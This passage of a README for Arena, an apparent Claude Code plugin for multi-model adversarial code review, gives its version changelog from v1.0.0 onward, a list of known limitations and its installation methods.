- **Context Density Filtering**: Role-based context filtering provides each agent with relevant code patterns only, reducing noise and token cost (8,000 token budget per agent)
- **Memory Tiers**: 4-tier memory architecture (working/short-term/long-term/permanent) for cross-session learning
- **Pipeline Evaluation**: Precision/recall/F1 metrics with LLM-as-Judge scoring and position bias mitigation
- **Agent Hardening**: Error Recovery Protocol added to all agents (retry → partial submit → team lead notification)
- **Positive Framing** ([arxiv 2602.11988](https://arxiv.org/abs/2602.11988)): All agent specs reframed from negative ("When NOT to Report") to positive ("Reporting Threshold") to avoid the pink elephant effect
- **Duplicate Prompt Technique** ([arxiv 2512.14982](https://arxiv.org/abs/2512.14982)): Core review instructions repeated in external CLI scripts for improved non-reasoning LLM accuracy
- **Stale Review Detection**: Git-hash-based review freshness check prevents acting on outdated findings when code changes mid-review
- **Prompt Cache-Aware Cost Estimation**: `prompt_cache_discount` config for accurate cost projections with Claude's prefix caching
- **Codex Structured Output**: `--output-schema` + `-o` flags for guaranteed-valid JSON output, eliminating 4-layer JSON extraction fallback. 5 JSON schemas for code review, cross-examine, defend, business review, and business cross-review. Controlled by `models.codex.structured_output` (default: `true`)
- **Codex Multi-Agent Sub-Agents**: 5 custom agent configs in `.codex/agents/` (new format) with per-agent model, reasoning effort, and display nicknames. CSV batch review support. Controlled by `models.codex.multi_agent.enabled` (default: `true`)
- **OpenAI WebSocket Debate Acceleration**: Persistent WebSocket connection (`wss://api.openai.com/v1/responses`) for ~40% faster debate rounds via `previous_response_id` chaining. Python client (`scripts/openai-ws-debate.py`) with automatic HTTP fallback. Requires `pip install openai>=2.22.0`. Controlled by `websocket.enabled` (default: `true`)
- **Gemini CLI Hooks Cross-Compatibility**: Native Gemini CLI AfterTool hook adapter (`scripts/gemini-hook-adapter.sh`) translates Gemini hook events to Arena's review pipeline. Installer/uninstaller updated for Gemini settings. Controlled by `gemini_hooks.enabled` (default: `true`)

### v3.1.0

- **Business Pipeline** with Codex/Gemini external CLI integration
  - Dual-mode scripts: `codex-business-review.sh` and `gemini-business-review.sh` (`--mode round1` for primary review, `--mode round2` for cross-review)
  - Intensity-dependent roles: cross-reviewer at standard/deep, benchmark-driven primary at comprehensive
- **Business Model Benchmarking** (Phase B4): 12 planted-error test cases (3 per category), F1 scoring, benchmark-driven role assignment
- **Fallback Framework**: Structured 6-level (code) / 5-level (business) graceful degradation with state tracking and report integration
- **Cost & Time Estimation** (Phase 0.2 / B0.2): Pre-execution cost breakdown with proceed/adjust/cancel
- **Code Auto-Fix Loop** (Phase 6.5): Auto-fixes safe, high-confidence findings with test verification and full revert on failure
- **Intensity Checkpoints** (Phase 2.9 / B2.9): Bidirectional mid-pipeline adjustment (upgrade or downgrade) based on research findings
- **Feedback Loop**: JSONL-based feedback tracking with per-model/per-category accuracy reports (`feedback-tracker.sh`)
- **Context Forwarding**: Multi-route requests pass context between pipelines with tiered token limits (20K total hard limit)
- Updated `business-debate-arbitrator.md` with external model handling (equal weight, implicit_defend, confidence normalization)

### v2.7.0

- **Business Content Lifecycle Orchestrator** (`arena-business.md`)
  - Routes G (content), H (strategy), I (communication)
  - 5 business reviewer agents + business-debate-arbitrator
  - Phases B0-B7: context extraction, market research, best practices, accuracy audit, strategy debate, review, report
- Updated ARENA-ROUTER.md with 9 routes (A-F code, G-I business)

### v2.6.0

- **3-Round Cross-Examination** between Claude, Codex, and Gemini
  - Round 2: each model evaluates other models' findings (agree/disagree/partial)
  - Round 3: each model defends its findings against challenges (defend/concede/modify)
  - Consensus synthesis with `cross_examination_trail` per finding
- New: `codex-cross-examine.sh`, `gemini-cross-examine.sh`
- New prompt templates: `cross-examine.txt`, `defend.txt`

### v2.5.0

- **Success Criteria** defined before implementation, verified in final report (PASS/FAIL)
- **Scope Reviewer** agent enforces surgical changes
- Inspired by [Karpathy's coding principles](https://github.com/forrestchang/andrej-karpathy-skills)

### v2.4.0

- **Agent Teams adversarial debate** at 5 pipeline decision points
- Replaced static keyword rules with agent reasoning

### v2.3.0

- Pipeline loads command files via Read tool (fixes infinite recursion)

### v2.2.0

- Intent-based routing (replaces keyword matching)
- Language-agnostic (works in any language)
- Context Discovery phase

### v2.1.0

- Always-on routing
- Codebase Analysis (Phase 0.5)
- MCP Dependency Detection

### v2.0.0

- Full lifecycle orchestrator, research, stack detection, compliance, benchmarking

### v1.0.0

- Multi-AI adversarial code review with Claude + Codex + Gemini

## Limitations

- **Bash-based architecture.** All scripts require bash 4+. macOS ships bash 3.2; the installer works around this, but Windows requires WSL. See [ADR-001](docs/adr-001-bash-architecture.md) for the rationale and trade-offs.
- **Router adds ~2KB to system prompt.** ARENA-ROUTER.md is loaded into every Claude Code session. This reduces available context window by ~2KB.
- **External CLIs required for cross-examination.** Without Codex and Gemini CLIs, Arena falls back to Claude-only review. The 3-round cross-examination requires at least 2 model families.
- **Benchmarks use planted bugs.** Test cases contain intentionally obvious vulnerabilities. Real-world code has subtler issues that may not be caught at the same rate.
- **LLM non-determinism.** Results vary between runs. The same code can get different findings, different F1 scores, and different intensity decisions on consecutive runs.
- **Cost scales with intensity.** A `comprehensive` review with 3 models and 10+ agents costs significantly more than a `quick` Claude-solo pass. The cost estimator (Phase 0.2) helps, but actual costs depend on input size and model pricing.
- **Markdown-as-code pipelines.** Pipeline definitions are 2500+ line markdown files executed by Claude. This is unconventional and harder to debug than traditional code. See [ADR-002](docs/adr-002-markdown-pipelines.md) for the rationale.

---

## Distribution

Arena is distributed as a Claude Code plugin. Two installation methods are supported:

| Method | Command | Auto-Update |
|--------|---------|-------------|
| **Marketplace** | `/plugin marketplace add HajinJ/ai-review-arena` | Yes |
| **From Source** | `git clone` + `./install.sh` | Manual (`git pull`) |

The marketplace method is recommended for most users. Source installation gives you access to development tools (`make test`, `make lint`, `make benchmark`).

---

## License

MIT
